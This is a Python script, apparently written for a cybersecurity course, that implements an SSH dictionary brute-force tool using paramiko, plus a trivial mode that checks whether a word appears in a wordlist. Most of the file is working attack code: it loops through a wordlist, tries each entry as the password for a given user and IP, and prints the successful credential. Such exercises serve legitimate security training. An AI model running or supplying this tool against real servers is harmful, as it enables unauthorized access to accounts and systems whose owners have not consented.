# Script Name:                  Automated Brute Force Wordlist Attack Tool Part 2 of 3
# Author:                       Gilbert Collado
# Date of latest revision:      05/21/2024
# Purpose:                      This script iterates through a word list with a delay or checks if a specific word exists in the list, offering two modes: Offensive (Dictionary Iterator) and Defensive (Password Recognized), SSH Brute Force Capabilities.
# Source1:                      https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# Source2:                      https://github.com/codefellows/seattle-cybersecurity-401d12/blob/main/class-17/challenges/DEMO.md

#!/usr/bin/env python3

import time
import nltk
from nltk.tokenize import word_tokenize
import paramiko

# Ensure necessary NLTK data files are downloaded
nltk.download('punkt')

# Function for SSH Brute Force
def ssh_brute_force(ip, username, word_list_path, delay):
    try:
        with open(word_list_path, 'r') as file:
            for line in file:
                words = word_tokenize(line)
                for word in words:
                    word = word.strip()
                    if attempt_ssh_login(ip, username, word):
                        print(f"Successful login: {username}@{ip} with password: {word}")
                        return
                    print(f"Failed login: {username}@{ip} with password: {word}")
                    time.sleep(delay)
    except FileNotFoundError:
        print("File not found. Please check the path and try again.")

# Function to attempt SSH login
def attempt_ssh_login(ip, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip, username=username, password=password)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except paramiko.SSHException as e:
        print(f"SSH connection error: {e}")
        return False

# Function for Offensive Mode
def offensive_mode():
    word_list_path = input("Enter the path to the word list file: ")
    delay = float(input("Enter the delay between words (in seconds): "))
    ip = input("Enter the IP address of the SSH server: ")
    username = input("Enter the username: ")

    ssh_brute_force(ip, username, word_list_path, delay)

# Function for Defensive Mode
def defensive_mode():
    search_string = input("Enter the string to search for: ")
    word_list_path = input("Enter the path to the word list file: ")
    found = False

    try:
        with open(word_list_path, 'r') as file:
            for line in file:
                word_tokens = set(word_tokenize(line.strip()))
                if search_string in word_tokens:
                    found = True
                    break
    except FileNotFoundError:
        print("File not found. Please check the path and try again.")
        return

    if found:
        print(f"The string '{search_string}' was found in the word list.")
    else:
        print(f"The string '{search_string}' was not found in the word list.")

# Main function to select and run the appropriate mode
def main():
    print("Select a mode:")
    print("1: Offensive; Dictionary Iterator")
    print("2: Defensive; Password Recognized")
    
    mode = input("Enter the mode number (1 or 2): ")
    
    if mode == '1':
        offensive_mode()
    elif mode == '2':
        defensive_mode()
    else:
        print("Invalid mode selected. Please enter 1 or 2.")

# Check if the script is being run directly
if __name__ == "__main__":
    main()

